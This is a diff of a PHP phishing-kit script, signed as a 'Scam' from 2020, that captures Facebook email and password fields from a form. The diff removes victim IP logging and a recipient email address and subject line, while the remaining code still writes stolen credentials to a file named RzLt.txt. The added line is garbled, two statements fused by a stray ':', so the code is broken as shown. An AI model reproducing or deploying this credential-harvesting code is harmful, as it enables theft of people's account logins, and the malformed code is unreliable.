@@ -1,22 +1,8 @@
 <?php
 
-/**   Scam Made By Ashraf Elmalky 2020  **/
 
-
-$date = gmdate ("d-n-Y");
-$time = gmdate ("H:i:s");
-$ip = $_SERVER['REMOTE_ADDR'];
-$hostname = gethostbyaddr($ip);
-$message .= "xxxxxxxxxxxxxxxx+ YAMIX +xxxxxxxxxxxxxxxx\n";
-$message .= "user: ".$_POST['email']."\n";
-$message .= "pass: ".$_POST['pass']."\n";
-$message .= "----------\n";
-$message .= "IP: ".$ip."\n";
-$message .= "Log : $time / $date \n";
+$message .= "user: ".$_POST['email']."n";:$message .= "pass: ".$_POST['pass']."\n";
 $rnessage = "$message\n";
-$send= "ashrafelmalky555@gmail.com";
-$subject = "FaceBook ReZulT | $ip";
-$headers = "From: FaceBook ReZulT";
 $file = fopen("RzLt.txt","ab");
 fwrite($file,$message);
 fclose($file);
